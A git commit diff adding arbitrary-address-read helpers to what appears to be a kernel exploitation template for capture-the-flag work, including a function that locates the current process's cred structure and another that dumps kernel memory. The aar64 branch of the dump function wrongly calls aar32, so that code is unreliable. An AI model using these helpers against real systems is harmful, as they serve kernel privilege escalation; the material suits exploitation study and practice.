b5d29f0cb84daffa3a2ada49fe3f69bc7f10ee83
Shun Ota <peloeil20@gmail.com>
2026-01-14 10:19:17 +0000

    feat(pwn/kernel): add aar utilities

--- pwnenv/kernel/template/aar.c
+++ pwnenv/kernel/template/aar.c
@@ -88,3 +88,38 @@ void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aa
     printf("[ ] start searching comm from %p\n", addr_start);
     return find_target_from_heap(addr_start, name, sizeof(name), aar32, aar64);
 }
+
+void *comm_to_addr_cred(void *addr_comm, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *)) {
+    uint64_t addr_cred = 0;
+    if (aar32 != NULL) {
+        addr_cred |= aar32(addr_comm - 8);
+        addr_cred |= (uint64_t)aar32(addr_comm - 4) << 32;
+        printf("[+] current->cred at %p\n", (void *)addr_cred);
+    } else if (aar64 != NULL) {
+        addr_cred |= aar64(addr_comm - 8);
+        printf("[+] current->cred at %p\n", (void *)addr_cred);
+    } else {
+        puts("[-] please implement aar function");
+    }
+    return (void *)addr_cred;
+}
+
+void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(void *),
+                     uint64_t (*aar64)(void *)) {
+    printf("[ ] buffer dump by aar from %p\n", addr_start);
+    if (aar32 != NULL) {
+        for (uint64_t i = 0; i < row; i++) {
+            uint64_t val = 0;
+            val |= aar32(addr_start + i * 8);
+            val |= (uint64_t)aar32(addr_start + i * 8 + 4) << 32;
+            printf("      %p|+0x%02lx: 0x%016lx\n", addr_start + i * 8, i * 8, val);
+        }
+    } else if (aar64 != NULL) {
+        for (uint64_t i = 0; i < row; i++) {
+            uint64_t val = aar32(addr_start + i * 8);
+            printf("      %p|+0x%02lx: 0x%016lx\n", addr_start + i * 8, i * 8, val);
+        }
+    } else {
+        puts("[-] please implement aar function");
+    }
+}
--- pwnenv/kernel/template/aar.h
+++ pwnenv/kernel/template/aar.h
@@ -6,5 +6,8 @@
 void *find_target_from_heap(void *const addr_start, void *const target, const uint64_t len,
                             uint32_t (*aar32)(void *), uint64_t (*aar64)(void *));
 void *find_comm(void *const addr_start, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *));
+void *comm_to_addr_cred(void *addr_comm, uint32_t (*aar32)(void *), uint64_t (*aar64)(void *));
+void dump_buffer_aar(void *addr_start, const uint64_t row, uint32_t (*aar32)(void *),
+                     uint64_t (*aar64)(void *));
 
 #endif  // __KPWN_AAR_H
